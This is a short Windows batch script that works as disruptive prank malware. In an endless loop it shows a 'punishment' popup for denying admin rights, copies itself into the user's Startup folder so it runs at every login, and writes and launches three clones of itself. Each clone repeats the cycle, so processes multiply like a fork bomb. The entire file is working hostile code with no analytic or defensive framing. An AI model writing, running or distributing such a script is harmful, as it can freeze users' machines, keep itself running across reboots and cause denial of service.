@echo off
title You messed up!

:loop
:: Spawn a hidden popup
start "" powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('You denied admin, deal with it!','Punishment')"

:: Copy itself to startup folder
copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\punish.bat" >nul

:: Create 3 clones for overload
copy "%~f0" "%~dp0punish1.bat" >nul
copy "%~f0" "%~dp0punish2.bat" >nul
copy "%~f0" "%~dp0punish3.bat" >nul

:: Start clones
start "" "%~dp0punish1.bat"
start "" "%~dp0punish2.bat"
start "" "%~dp0punish3.bat"

timeout /t 1 >nul
goto loop
